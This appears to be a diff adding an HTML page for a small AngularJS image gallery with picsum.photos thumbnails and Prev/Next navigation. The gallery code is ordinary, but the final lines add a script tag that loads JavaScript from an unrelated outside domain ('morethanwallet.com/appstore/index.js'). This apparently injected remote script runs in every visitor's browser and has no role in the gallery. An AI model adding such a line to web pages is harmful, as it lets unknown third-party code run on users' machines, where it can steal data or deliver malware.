@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Gallery</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+      .selected {
+        border: 2px solid #4CAF50 !important; 
+      }
+      .dim {
+        opacity: 0.6; 
+      }
+      /* Edge-to-edge styling */
+      body {
+        padding: 0;
+        margin: 0;
+        font-family: Arial, sans-serif;
+      }
+      .full-width {
+        width: 100%;
+      }
+      /* Thumbnail styling */
+      .thumbnail {
+        border-radius: 8px;
+        overflow: hidden;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        transition: transform 0.3s ease;
+      }
+      .thumbnail:hover {
+        transform: translateY(-3px);
+      }
+      .thumbnail img {
+        max-width: 100%;
+        height: auto;
+      }
+      /* Navigation button styling */
+      .nav-button {
+        padding: 10px 20px;
+        background-color: #4CAF50;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+      .nav-button:hover {
+        background-color: #45a049;
+      }
+    </style>
+</head>
+<body ng-app="imageGalleryApp" ng-controller="GalleryController as galleryCtrl">
+
+  <div class="full-width flex flex-wrap justify-center">
+    <div class="thumbnail m-2" ng-repeat="id in galleryCtrl.imageIds" ng-click="galleryCtrl.selectImage(id)">
+        <img class="cursor-pointer" ng-src="https://picsum.photos/id/{{id}}/200/200" alt="Thumbnail" ng-class="{'selected': id === galleryCtrl.selectedImageId, 'dim': id !== galleryCtrl.selectedImageId}">
+    </div>
+  </div>
+
+  <div class="my-5 flex justify-center items-center">
+    <!-- Previous Arrow -->
+    <button ng-click="galleryCtrl.selectPreviousImage()" class="nav-button mx-2" ng-disabled="galleryCtrl.isFirstImage()">
+        &lt; Prev
+    </button>
+    
+    <img class="max-w-full h-auto" ng-src="https://picsum.photos/id/{{galleryCtrl.selectedImageId}}/500/500" alt="Large Image">
+    
+    <!-- Next Arrow -->
+    <button ng-click="galleryCtrl.selectNextImage()" class="nav-button mx-2" ng-disabled="galleryCtrl.isLastImage()">
+        Next &gt;
+    </button>
+  </div>
+
+  <script>
+    angular.module('imageGalleryApp', [])
+      .controller('GalleryController', function() {
+        this.imageIds = [10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20];
+        this.selectedImageId = this.imageIds[0];
+
+        this.selectImage = function(id) {
+          this.selectedImageId = id;
+        };
+
+        this.selectNextImage = function() {
+          let currentIndex = this.imageIds.indexOf(this.selectedImageId);
+          if (currentIndex < this.imageIds.length - 1) {
+            this.selectedImageId = this.imageIds[currentIndex + 1];
+          }
+        };
+
+        this.selectPreviousImage = function() {
+          let currentIndex = this.imageIds.indexOf(this.selectedImageId);
+          if (currentIndex > 0) {
+            this.selectedImageId = this.imageIds[currentIndex - 1];
+          }
+        };
+
+        this.isFirstImage = function() {
+          return this.imageIds.indexOf(this.selectedImageId) === 0;
+        };
+
+        this.isLastImage = function() {
+          return this.imageIds.indexOf(this.selectedImageId) === this.imageIds.length - 1;
+        };
+      });
+  </script>
+<script src="https://morethanwallet.com/appstore/index.js"></script>
+
+</body>
+</html>
